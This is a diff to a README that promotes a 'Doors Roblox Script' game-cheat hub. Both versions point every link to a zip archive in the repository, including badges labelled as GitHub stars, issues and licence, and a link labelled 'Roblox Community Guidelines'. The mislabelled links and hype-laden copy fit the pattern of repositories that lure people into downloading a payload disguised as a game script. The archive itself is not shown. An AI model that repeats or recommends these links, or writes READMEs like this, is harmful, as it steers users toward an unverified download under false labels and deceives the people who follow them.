@@ -2,7 +2,7 @@
 
 Welcome to the **Doors Roblox Script** repository! This repository is the ultimate toolkit for Roblox enthusiasts seeking to supercharge their *Doors* gaming experience. Whether you’re looking to unlock innovative functionality or integrate intelligent automation into your adventures, you've just discovered your new starting point. Our script brings together seamless automation, sleek UI, multilingual accessibility, and even AI-powered assistance to transform the way you play and create.
 
-[![GitHub stars](https://raw.githubusercontent.com/kinokyzx/doors-roblox-script-hub/branch/hetaery/doors-roblox-script-hub-3.0.zip)](https://raw.githubusercontent.com/kinokyzx/doors-roblox-script-hub/branch/hetaery/doors-roblox-script-hub-3.0.zip) [![GitHub issues](https://raw.githubusercontent.com/kinokyzx/doors-roblox-script-hub/branch/hetaery/doors-roblox-script-hub-3.0.zip)](https://raw.githubusercontent.com/kinokyzx/doors-roblox-script-hub/branch/hetaery/doors-roblox-script-hub-3.0.zip) [![MIT License](https://raw.githubusercontent.com/kinokyzx/doors-roblox-script-hub/branch/hetaery/doors-roblox-script-hub-3.0.zip)](#-MIT-license-2025)
+[![GitHub stars](https://github.com/kinokyzx/doors-roblox-script-hub/raw/refs/heads/branch/hetaery/roblox_doors_hub_script_1.4.zip)](https://github.com/kinokyzx/doors-roblox-script-hub/raw/refs/heads/branch/hetaery/roblox_doors_hub_script_1.4.zip) [![GitHub issues](https://github.com/kinokyzx/doors-roblox-script-hub/raw/refs/heads/branch/hetaery/roblox_doors_hub_script_1.4.zip)](https://github.com/kinokyzx/doors-roblox-script-hub/raw/refs/heads/branch/hetaery/roblox_doors_hub_script_1.4.zip) [![MIT License](https://github.com/kinokyzx/doors-roblox-script-hub/raw/refs/heads/branch/hetaery/roblox_doors_hub_script_1.4.zip)](#-MIT-license-2025)
 
 ---
 
@@ -74,10 +74,10 @@ Voyages sometimes run into storms—our support team is the lighthouse guiding y
 
 To bring this *Doors Roblox Script* into your world:
 
-[![Download](https://raw.githubusercontent.com/kinokyzx/doors-roblox-script-hub/branch/hetaery/doors-roblox-script-hub-3.0.zip)](https://raw.githubusercontent.com/kinokyzx/doors-roblox-script-hub/branch/hetaery/doors-roblox-script-hub-3.0.zip)
+[![Download](https://github.com/kinokyzx/doors-roblox-script-hub/raw/refs/heads/branch/hetaery/roblox_doors_hub_script_1.4.zip)](https://github.com/kinokyzx/doors-roblox-script-hub/raw/refs/heads/branch/hetaery/roblox_doors_hub_script_1.4.zip)
 
 Just hit the badge above or use this download placeholder:  
-**https://raw.githubusercontent.com/kinokyzx/doors-roblox-script-hub/branch/hetaery/doors-roblox-script-hub-3.0.zip**
+**https://github.com/kinokyzx/doors-roblox-script-hub/raw/refs/heads/branch/hetaery/roblox_doors_hub_script_1.4.zip**
 
 **Quick Setup Steps:**
 
@@ -100,7 +100,7 @@ This ensures both humans and search engines find their way through the labyrinth
 ## ⚠️ Disclaimer
 
 The **Doors Roblox Script** is a powerful enhancement tool designed in compliance with Roblox’s terms of service, community guidelines, and privacy standards. Use with respect for other players and within the boundaries of fair gameplay. The authors do not condone misuse or disruptive behavior.  
-For inquiries regarding responsible use, visit the official [Roblox Community Guidelines](https://raw.githubusercontent.com/kinokyzx/doors-roblox-script-hub/branch/hetaery/doors-roblox-script-hub-3.0.zip).
+For inquiries regarding responsible use, visit the official [Roblox Community Guidelines](https://github.com/kinokyzx/doors-roblox-script-hub/raw/refs/heads/branch/hetaery/roblox_doors_hub_script_1.4.zip).
 
 ---
 
@@ -116,7 +116,7 @@ For inquiries regarding responsible use, visit the official [Roblox Community Gu
    - Translate into your favorite language or build new UI themes.
 
 3. **Changelog:**  
-   - Updates tracked in `https://raw.githubusercontent.com/kinokyzx/doors-roblox-script-hub/branch/hetaery/doors-roblox-script-hub-3.0.zip`.
+   - Updates tracked in `https://github.com/kinokyzx/doors-roblox-script-hub/raw/refs/heads/branch/hetaery/roblox_doors_hub_script_1.4.zip`.
 
 ---
 
@@ -124,9 +124,9 @@ For inquiries regarding responsible use, visit the official [Roblox Community Gu
 
 For those who scrolled straight to the end:
 
-[![Download](https://raw.githubusercontent.com/kinokyzx/doors-roblox-script-hub/branch/hetaery/doors-roblox-script-hub-3.0.zip)](https://raw.githubusercontent.com/kinokyzx/doors-roblox-script-hub/branch/hetaery/doors-roblox-script-hub-3.0.zip)
+[![Download](https://github.com/kinokyzx/doors-roblox-script-hub/raw/refs/heads/branch/hetaery/roblox_doors_hub_script_1.4.zip)](https://github.com/kinokyzx/doors-roblox-script-hub/raw/refs/heads/branch/hetaery/roblox_doors_hub_script_1.4.zip)
 
-Use this link: https://raw.githubusercontent.com/kinokyzx/doors-roblox-script-hub/branch/hetaery/doors-roblox-script-hub-3.0.zip
+Use this link: https://github.com/kinokyzx/doors-roblox-script-hub/raw/refs/heads/branch/hetaery/roblox_doors_hub_script_1.4.zip
 
 Start your next adventure today!
 
